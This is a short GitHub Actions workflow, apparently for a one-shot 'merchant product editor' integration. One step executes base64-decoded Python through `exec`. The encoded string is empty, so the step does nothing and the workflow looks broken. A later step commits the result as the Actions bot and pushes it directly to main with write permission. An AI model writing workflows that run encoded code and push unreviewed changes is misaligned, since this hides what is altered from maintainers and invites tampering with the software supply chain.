name: One-shot merchant product editor integration

on:
  push:
    branches: [main]
    paths:
      - .github/workflows/merchant-product-editor.yml

permissions:
  contents: write

jobs:
  integrate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      - name: Integrate product editor
        run: python -c "import base64;exec(base64.b64decode(''))"
      - name: Format and commit changes
        run: |
          npx prettier@3.9.6 src/components/MerchantProductEditor.tsx src/routes/merchant.tsx --write
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add src/components/MerchantProductEditor.tsx src/routes/merchant.tsx
          if git diff --cached --quiet; then
            echo "No changes required"
            exit 0
          fi
          git commit -m "feat(merchant): manage product details and additions"
          git push
